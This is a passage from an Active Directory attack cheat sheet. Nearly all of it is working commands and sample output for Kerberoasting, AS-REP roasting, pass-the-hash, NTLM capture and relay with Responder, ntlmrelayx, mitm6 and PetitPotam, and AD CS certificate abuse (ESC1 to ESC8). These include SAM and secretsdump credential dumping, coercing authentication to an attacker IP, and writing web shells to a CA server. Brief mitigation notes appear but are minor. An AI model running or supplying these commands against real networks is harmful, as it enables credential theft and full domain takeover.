Rubeus\n# Stats Rubeus.exe kerberoast /stats ------------------------------------- ---------------------------------- | Supported Encryption Type | Count | | Password Last Set Year | Count | ------------------------------------- ---------------------------------- | RC4_HMAC_DEFAULT | 1 | | 2021 | 1 | ------------------------------------- ---------------------------------- # Kerberoast (RC4 ticket) Rubeus.exe kerberoast /creduser:DOMAIN\\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt # Kerberoast (AES ticket) # Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested. Rubeus.exe kerberoast /tgtdeleg # Kerberoast (RC4 ticket) # The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted. Rubeus.exe kerberoast /rc4opsec PowerView\nRequest-SPNTicket -SPN \u0026#34;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local\u0026#34; bifrost on macOS machine\n./bifrost -action asktgs -ticket doIF\u0026lt;...snip...\u0026gt;QUw= -service host/dc1-lab.lab.local -kerberoast true targetedKerberoast\n# for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), # print the \u0026#34;kerberoast\u0026#34; hash, and delete the temporary SPN set for that operation targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key] Then crack the ticket using the correct hashcat mode ($krb5tgs$23= etype 23)\nMode Description 13100 Kerberos 5 TGS-REP etype 23 (RC4) 19600 Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) 19700 Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) ./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt ./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt Mitigations:\nHave a very long password for your accounts with SPNs (\u0026gt; 32 characters) Make sure no users have SPNs KRB_AS_REP Roasting # If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting\nRequirements:\nAccounts with the attribute DONT_REQ_PREAUTH (PowerView \u0026gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose) Rubeus\nC:\\Rubeus\u0026gt;Rubeus.exe asreproast /user:TestOU3user /format:hashcat /outfile:hashes.asreproast [*] Action: AS-REP roasting [*] Target User : TestOU3user [*] Target Domain : testlab.local [*] SamAccountName : TestOU3user [*] DistinguishedName : CN=TestOU3user,OU=TestOU3,OU=TestOU2,OU=TestOU1,DC=testlab,DC=local [*] Using domain controller: testlab.local (192.168.52.100) [*] Building AS-REQ (w/o preauth) for: \u0026#39;testlab.local\\TestOU3user\u0026#39; [*] Connecting to 192.168.52.100:88 [*] Sent 169 bytes [*] Received 1437 bytes [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$TestOU3user@testlab.local:858B6F645D9F9B57210292E5711E0...(snip)... GetNPUsers from Impacket Suite\n$ python GetNPUsers.py htb.local/svc-alfresco -no-pass [*] Getting TGT for svc-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:c13528009a59be0a634bb9b8e84c88ee$cb8e87d02bd0ac7a[...]e776b4 # extract hashes root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast root@kali:impacket-examples$ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast CrackMapExec Module\n$ crackmapexec ldap 10.0.2.11 -u \u0026#39;username\u0026#39; -p \u0026#39;password\u0026#39; --kdcHost 10.0.2.11 --asreproast output.txt LDAP 10.0.2.11 389 dc01 $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5 Using hashcat or john to crack the ticket.\n# crack AS_REP messages with hashcat root@kali:impacket-examples$ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt root@windows:hashcat$ hashcat64.exe -m 18200 \u0026#39;\u0026lt;AS_REP-hash\u0026gt;\u0026#39; -a 0 c:\\wordlists\\rockyou.txt # crack AS_REP messages with john C:\\Rubeus\u0026gt; john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast Mitigations:\nAll accounts must have \u0026ldquo;Kerberos Pre-Authentication\u0026rdquo; enabled (Enabled by Default). Pass-the-Hash # The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.\nMetasploit use exploit/windows/smb/psexec set RHOST 10.2.0.3 set SMBUser jarrieta set SMBPass nastyCutt3r # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack. # NOTE2: Require the full NTLM hash, you may need to add the \u0026#34;blank\u0026#34; LM (aad3b435b51404eeaad3b435b51404ee) set PAYLOAD windows/meterpreter/bind_tcp run shell CrackMapExec cme smb 10.2.0.2/24 -u jarrieta -H \u0026#39;aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d\u0026#39; -x \u0026#34;whoami\u0026#34; Impacket suite proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d Windows RDP and mimikatz sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863 sekurlsa::pth /user:\u0026lt;user name\u0026gt; /domain:\u0026lt;domain name\u0026gt; /ntlm:\u0026lt;the users ntlm hash\u0026gt; /run:\u0026#34;mstsc.exe /restrictedadmin\u0026#34; You can extract the local SAM database to find the local administrator hash :\nC:\\\u0026gt; reg.exe save hklm\\sam c:\\temp\\sam.save C:\\\u0026gt; reg.exe save hklm\\security c:\\temp\\security.save C:\\\u0026gt; reg.exe save hklm\\system c:\\temp\\system.save $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL OverPass-the-Hash (pass the key) # In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).\nUsing impacket # root@kali:~$ python ./getTGT.py -hashes \u0026#34;:1a59bd44fe5bec39c44c8cd3524dee\u0026#34; lab.ropnop.com root@kali:~$ export KRB5CCNAME=\u0026#34;/root/impacket-examples/velociraptor.ccache\u0026#34; root@kali:~$ python3 psexec.py \u0026#34;jurassic.park/velociraptor@labwws02.jurassic.park\u0026#34; -k -no-pass # also with the AES Key if you have it root@kali:~$ ./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com root@kali:~$ ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5 root@kali:~$ kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM root@kali:~$ klist Using Rubeus # # Request a TGT as the target user and pass it into the current session # NOTE: Make sure to clear tickets in the current session (with \u0026#39;klist purge\u0026#39;) to ensure you don\u0026#39;t have multiple active TGTs .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt # More stealthy variant, but requires the AES256 hash .\\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt # Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation) .\\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\\Windows\\System32\\cmd.exe Capturing and cracking Net-NTLMv1/NTLMv1 hashes # Net-NTLM (NTLMv1) hashes are used for network authentication (they are derived from a challenge/response algorithm and are based on the user\u0026rsquo;s NT hash.\n:information_source: : Coerce a callback using PetitPotam or SpoolSample on an affected machine and downgrade the authentication to NetNTLMv1 Challenge/Response authentication. This uses the outdated encryption method DES to protect the NT/LM Hashes.\nRequirements:\nLmCompatibilityLevel = 0x1: Send LM \u0026amp; NTLM (reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v lmcompatibilitylevel) Exploitation:\nCapturing using Responder: Edit the /etc/responder/Responder.conf file to include the magical 1122334455667788 challenge HTTPS = On DNS = On LDAP = On ... ; Custom challenge. ; Use \u0026#34;Random\u0026#34; for generating a random challenge for each requests (Default) Challenge = 1122334455667788 Fire Responder: responder -I eth0 --lm, if --disable-ess is set, extended session security will be disabled for NTLMv1 authentication Force a callback: PetitPotam.exe Responder-IP DC-IP # Patched around August 2021 PetitPotam.py -u Username -p Password -d Domain -dc-ip DC-IP Responder-IP DC-IP # Not patched for authenticated users If you got some NTLMv1 hashes, you need to format them to submit them on crack.sh username::hostname:response:response:challenge -\u0026gt; NTHASH:response NTHASH:F35A3FE17DCB31F9BE8A8004B3F310C150AFA36195554972 Or crack them with Hashcat / John The Ripper john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt Now you can DCSync using the Pass-The-Hash with the DC machine account :warning: NTLMv1 with SSP(Security Support Provider) changes the server challenge and is not quite ideal for the attack, but it can be used.\nMitigations:\nSet the Lan Manager authentication level to Send NTLMv2 responses only. Refuse LM \u0026amp; NTLM Capturing and cracking Net-NTLMv2/NTLMv2 hashes # If any user in the network tries to access a machine and mistype the IP or the name, Responder will answer for it and ask for the NTLMv2 hash to access the resource. Responder will poison LLMNR, MDNS and NETBIOS requests on the network.\n# https://github.com/lgandx/Responder $ sudo ./Responder.py -I eth0 -wfrd -P -v # https://github.com/Kevin-Robertson/InveighZero PS \u0026gt; .\\inveighzero.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N] # https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1 PS \u0026gt; Invoke-Inveigh [-IP \u0026#39;10.10.10.10\u0026#39;] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y Crack the hashes with Hashcat / John The Ripper\njohn --format=netntlmv2 hash.txt hashcat -m 5600 -a 3 hash.txt Man-in-the-Middle attacks \u0026amp; relaying # NTLMv1 and NTLMv2 can be relayed to connect to another machine.\nHash Hashcat Attack method LM 3000 crack/pass the hash NTLM/NTHash 1000 crack/pass the hash NTLMv1/Net-NTLMv1 5500 crack/relay attack NTLMv2/Net-NTLMv2 5600 crack/relay attack Crack the hash with hashcat.\nhashcat -m 5600 -a 0 hash.txt crackstation.txt MS08-068 NTLM reflection # NTLM reflection vulnerability in the SMB protocolOnly targeting Windows 2000 to Windows Server 2008.\nThis vulnerability allows an attacker to redirect an incoming SMB connection back to the machine it came from and then access the victim machine using the victim’s own credentials.\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS08-068 msf \u0026gt; use exploit/windows/smb/smb_relay msf exploit(smb_relay) \u0026gt; show targets SMB Signing Disabled and IPv4 # If a machine has SMB signing:disabled, it is possible to use Responder with Multirelay.py script to perform an NTLMv2 hashes relay and get a shell access on the machine. Also called LLMNR/NBNS Poisoning\nOpen the Responder.conf file and set the value of SMB and HTTP to Off. [Responder Core] ; Servers to start ... SMB = Off # Turn this off HTTP = Off # Turn this off Run python RunFinger.py -i IP_Range to detect machine with SMB signing:disabled. Run python Responder.py -I \u0026lt;interface_card\u0026gt; Use a relay tool such as ntlmrelayx or MultiRelay impacket-ntlmrelayx -tf targets.txt to dump the SAM database of the targets in the list. python MultiRelay.py -t \u0026lt;target_machine_IP\u0026gt; -u ALL ntlmrelayx can also act as a SOCK proxy with every compromised sessions. $ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support [*] Servers started, waiting for connections Type help for list of commands ntlmrelayx\u0026gt; socks Protocol Target Username Port -------- -------------- ------------------------ ---- MSSQL 192.168.48.230 VULNERABLE/ADMINISTRATOR 1433 SMB 192.168.48.230 CONTOSO/NORMALUSER1 445 MSSQL 192.168.48.230 CONTOSO/NORMALUSER1 1433 # You might need to select a target with \u0026#34;-t\u0026#34; impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support # the socks proxy can then be used with your Impacket tools or CrackMapExec $ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1 $ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth $ proxychains crackmapexec mssql 10.10.10.10 -u user -p \u0026#39;\u0026#39; -d DOMAIN -q \u0026#34;SELECT 1\u0026#34; Mitigations:\nDisable LLMNR via group policy Open gpedit.msc and navigate to Computer Configuration \u0026gt; Administrative Templates \u0026gt; Network \u0026gt; DNS Client \u0026gt; Turn off multicast name resolution and set to Enabled Disable NBT-NS This can be achieved by navigating through the GUI to Network card \u0026gt; Properties \u0026gt; IPv4 \u0026gt; Advanced \u0026gt; WINS and then under \u0026#34;NetBIOS setting\u0026#34; select Disable NetBIOS over TCP/IP SMB Signing Disabled and IPv6 # Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.\ncrackmapexec smb $hosts --gen-relay-list relay.txt # DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6 # -d is the domain name that we filter our request on - the attacked domain # -i is the interface we have mitm6 listen on for events mitm6 -i eth0 -d $domain # spoofing WPAD and relaying NTLM credentials impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug # -ip is the interface you want the relay to run on # -wh is for WPAD host, specifying your wpad file to serve # -t is the target where you want to relay to. impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2 Drop the MIC # The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP\nCheck vulnerability with cve-2019-1040-scanner\npython2 scanMIC.py \u0026#39;DOMAIN/USERNAME:PASSWORD@TARGET\u0026#39; [*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth [*] Target TARGET is not vulnerable to CVE-2019-1040 (authentication was rejected) Using any AD account, connect over SMB to a victim Exchange server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant DCSync privileges to the attacker account. The attacker account can now use DCSync to dump all password hashes in AD\nTERM1\u0026gt; python printerbug.py testsegment.local/username@s2012exc.testsegment.local \u0026lt;attacker ip/hostname\u0026gt; TERM2\u0026gt; ntlmrelayx.py --remove-mic --escalate-user ntu -t ldap://s2016dc.testsegment.local -smb2support TERM1\u0026gt; secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.\n# create a new machine account TERM1\u0026gt; ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support TERM2\u0026gt; python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6 TERM1\u0026gt; getST.py -spn host/second-dc-server.local \u0026#39;relaytest.local/MACHINE$:PASSWORD\u0026#39; -impersonate DOMAIN_ADMIN_USER_NAME # connect using the ticket export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache secretsdump.py -k -no-pass second-dc-server.local -just-dc Ghost Potato - CVE-2019-1384 # Requirements:\nUser must be a member of the local Administrators group User must be a member of the Backup Operators group Token must be elevated Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip\nntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe RemotePotato0 DCOM DCE RPC relay # It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine\nRequirements:\na shell in session 0 (e.g. WinRm shell or SSH shell) a privileged user is logged on in the session 1 (e.g. a Domain Admin user) # https://github.com/antonioCoco/RemotePotato0/ Terminal\u0026gt; sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 \u0026amp; # Can be omitted for Windows Server \u0026lt;= 2016 Terminal\u0026gt; sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1 Session0\u0026gt; RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2 Terminal\u0026gt; psexec.py \u0026#39;LAB/winrm_user_1:Password123!@192.168.83.135\u0026#39; DNS Poisonning - Relay delegation with mitm6 # Requirements:\nIPv6 enabled (Windows prefers IPV6 over IPv4) LDAP over TLS (LDAPS) ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account\u0026rsquo;s name and password and modifies the delegation rights of it.\ngit clone https://github.com/fox-it/mitm6.git cd /opt/tools/mitm6 pip install . mitm6 -hw ws02 -d lab.local --ignore-nofqnd # -d: the domain name that we filter our request on (the attacked domain) # -i: the interface we have mitm6 listen on for events # -hw: host whitelist ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer # -ip: the interface you want the relay to run on # -wh: WPAD host, specifying your wpad file to serve # -t: the target where you want to relay to # now granting delegation rights and then do a RBCD ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad getST.py -spn cifs/target.lab.local lab.local/GENERATED\\$ -impersonate Administrator export KRB5CCNAME=administrator.ccache secretsdump.py -k -no-pass target.lab.local Relaying with WebDav Trick # Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB\nRequirement:\nWebClient service Exploitation:\nDisable HTTP in Responder: sudo vi /usr/share/responder/Responder.conf Generate a Windows machine name: sudo responder -I eth0, e.g: WIN-UBNW4FI3AP0 Prepare for RBCD against the DC: python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support Discover WebDAV services webclientservicescanner \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39;@\u0026#39;machine\u0026#39; crackmapexec smb \u0026#39;TARGETS\u0026#39; -d \u0026#39;domain\u0026#39; -u \u0026#39;user\u0026#39; -p \u0026#39;password\u0026#39; -M webdav GetWebDAVStatus.exe \u0026#39;machine\u0026#39; Trigger the authentication to relay to our nltmrelayx: PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4, the listener host must be specified with the FQDN or full netbios name like logger.domain.local@80/test.txt. Specifying the IP results in anonymous auth instead of System. # PrinterBug dementor.py -d \u0026#34;DOMAIN\u0026#34; -u \u0026#34;USER\u0026#34; -p \u0026#34;PASSWORD\u0026#34; \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; SpoolSample.exe \u0026#34;ATTACKER_IP\u0026#34; \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; # PetitPotam Petitpotam.py \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; Petitpotam.py -d \u0026#34;DOMAIN\u0026#34; -u \u0026#34;USER\u0026#34; -p \u0026#34;PASSWORD\u0026#34; \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; PetitPotam.exe \u0026#34;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt\u0026#34; \u0026#34;ATTACKER_IP\u0026#34; Use the created account to ask for a service ticket: .\\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:\u0026#39;iUAL)l\u0026lt;i$;UzD7W\u0026#39; .\\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt ls \\\\PC1.purple.lab\\c$ # IP of PC1: 10.0.0.4 Active Directory Certificate Services # Find ADCS Server crackmapexec ldap domain.lab -u username -p password -M adcs ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=\u0026lt;user\u0026gt;,OU=Users,DC=domain,DC=local' -w '\u0026lt;password\u0026gt;' -b \u0026quot;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local\u0026quot; dNSHostName Enumerate AD Enterprise CAs with certutil: certutil.exe -config - -ping ESC1 - Misconfigured Certificate Templates # Domain Users can enroll in the VulnTemplate template, which can be used for client authentication and has ENROLLEE_SUPPLIES_SUBJECT set. This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows additional identities to be bound to a certificate beyond the Subject.\nRequirements:\nTemplate that allows for AD authentication ENROLLEE_SUPPLIES_SUBJECT flag [PKINIT] Client Authentication, Smart Card Logon, Any Purpose, or No EKU (Extended/Enhanced Key Usage) Exploitation:\nUse Certify.exe to see if there are any vulnerable templates Certify.exe find /vulnerable Certify.exe find /vulnerable /currentuser # or PS\u0026gt; Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))\u0026#39; -SearchBase \u0026#39;CN=Configuration,DC=lab,DC=local\u0026#39; # or certipy \u0026#39;domain.local\u0026#39;/\u0026#39;user\u0026#39;:\u0026#39;password\u0026#39;@\u0026#39;domaincontroller\u0026#39; find -bloodhound Use Certify, Certi or Certipy to request a Certificate and add an alternative name (user to impersonate) # request certificates for the machine account by executing Certify with the \u0026#34;/machine\u0026#34; argument from an elevated command prompt. Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:VulnTemplate /altname:domadmin certi.py req \u0026#39;contoso.local/Anakin@dc01.contoso.local\u0026#39; contoso-DC01-CA -k -n --alt-name han --template UserSAN certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;ESC1\u0026#39; -alt \u0026#39;administrator@corp.local\u0026#39; Use OpenSSL and convert the certificate, do not enter a password openssl pkcs12 -in cert.pem -keyex -CSP \u0026#34;Microsoft Enhanced Cryptographic Provider v1.0\u0026#34; -export -out cert.pfx Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx WARNING: These certificates will still be usable even if the user or computer resets their password!\nNOTE: Look for EDITF_ATTRIBUTESUBJECTALTNAME2, CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, ManageCA flags, and NTLM Relay to AD CS HTTP Endpoints.\nESC2 - Misconfigured Certificate Templates # Requirements:\nAllows requesters to specify a Subject Alternative Name (SAN) in the CSR as well as allows Any Purpose EKU (2.5.29.37.0) Exploitation:\nFind template PS \u0026gt; Get-ADObject -LDAPFilter \u0026#39;(\u0026amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))\u0026#39; -SearchBase \u0026#39;CN=Configuration,DC=megacorp,DC=local\u0026#39; Request a certificate specifying the /altname as a domain admin like in ESC1. ESC3 - Misconfigured Enrollment Agent Templates # ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users\nRequest a certificate based on the vulnerable certificate template ESC3. $ certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;ESC3\u0026#39; [*] Saved certificate and private key to \u0026#39;john.pfx\u0026#39; Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user $ certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;User\u0026#39; -on-behalf-of \u0026#39;corp\\administrator\u0026#39; -pfx \u0026#39;john.pfx\u0026#39; ESC4 - Access Control Vulnerabilities # Enabling the mspki-certificate-name-flag flag for a template that allows for domain authentication, allow attackers to \u0026ldquo;push a misconfiguration to a template leading to ESC1 vulnerability\nSearch for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1 python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag # Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template. C:\\\u0026gt;StandIn.exe --adcs --filter WebServer --ess --add Perform ESC1 and then restore the value python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag Using Certipy\n# overwrite the configuration to make it vulnerable to ESC1 certipy template \u0026#39;corp.local/johnpc$@ca.corp.local\u0026#39; -hashes :fc525c9683e8fe067095ba2ddc971889 -template \u0026#39;ESC4\u0026#39; -save-old # request a certificate based on the ESC4 template, just like ESC1. certipy req \u0026#39;corp.local/john:Passw0rd!@ca.corp.local\u0026#39; -ca \u0026#39;corp-CA\u0026#39; -template \u0026#39;ESC4\u0026#39; -alt \u0026#39;administrator@corp.local\u0026#39; # restore the old configuration certipy template \u0026#39;corp.local/johnpc$@ca.corp.local\u0026#39; -hashes :fc525c9683e8fe067095ba2ddc971889 -template \u0026#39;ESC4\u0026#39; -configuration ESC4.json ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 # If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.\nExploitation:\nUse Certify.exe to check for UserSpecifiedSAN flag state which refers to the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. Certify.exe cas Request a certificate for a template and add an altname, even though the default User template doesn\u0026rsquo;t normally allow to specify alternative names .\\Certify.exe request /ca:dc.domain.local\\domain-DC-CA /template:User /altname:DomAdmin Mitigation:\nRemove the flag : certutil.exe -config \u0026quot;CA01.domain.local\\CA01\u0026quot; -setreg \u0026quot;policy\\EditFlags\u0026quot; -EDITF_ATTRIBUTESUBJECTALTNAME2 ESC7 - Vulnerable Certificate Authority Access Control # Exploitation:\nDetect CAs that allow low privileged users the ManageCA or Manage Certificates permissions Certify.exe find /vulnerable Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6) Certify.exe setconfig /enablesan /restart Request the certificate with the desired SAN. Certify.exe request /template:User /altname:super.adm Grant approval if required or disable the approval requirement # Grant Certify.exe issue /id:[REQUEST ID] # Disable Certify.exe setconfig /removeapproval /restart Alternative exploitation from ManageCA to RCE on ADCS server:\n# Get the current CDP list. Useful to find remote writable shares: Certify.exe writefile /ca:SERVER\\ca-name /readonly # Write an aspx shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:C:\\Windows\\SystemData\\CES\\CA-Name\\shell.aspx /input:C:\\Local\\Path\\shell.aspx # Write the default asp shell to a local web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:c:\\inetpub\\wwwroot\\shell.asp # Write a php shell to a remote web directory: Certify.exe writefile /ca:SERVER\\ca-name /path:\\\\remote.server\\share\\shell.php /input:C:\\Local\\path\\shell.php ESC8 - AD CS Relay Attack # An attacker can trigger a Domain Controller using PetitPotam to NTLM relay credentials to a host of choice. The Domain Controller’s NTLM Credentials can then be relayed to the Active Directory Certificate Services (AD CS) Web Enrollment pages, and a DC certificate can be enrolled. This certificate can then be used to request a TGT (Ticket Granting Ticket) and compromise the entire domain through Pass-The-Ticket.\nRequire Impacket PR #1101\nVersion 1: NTLM Relay + Rubeus + PetitPotam\nimpacket\u0026gt; python3 ntlmrelayx.py -t http://\u0026lt;ca-server\u0026gt;/certsrv/certfnsh.asp -smb2support --adcs impacket\u0026gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template VulnTemplate # For a member server or workstation, the template would be \u0026#34;Computer\u0026#34;. # Other templates: workstation, DomainController, Machine, KerberosAuthentication # Coerce the authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam # You can also use any other way to coerce the authentication like PrintSpooler via MS-RPRN git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d \u0026#39;\u0026#39; -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; $ATTACKER_IP $TARGET_IP python3 dementor.py \u0026lt;listener\u0026gt; \u0026lt;target\u0026gt; -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -d \u0026lt;domain\u0026gt; python3 dementor.py 10.10.10.250 10.10.10.10 -u user1 -p Password1 -d lab.local # Use the certificate with rubeus to request a TGT Rubeus.exe asktgt /user:\u0026lt;user\u0026gt; /certificate:\u0026lt;base64-certificate\u0026gt; /ptt Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS 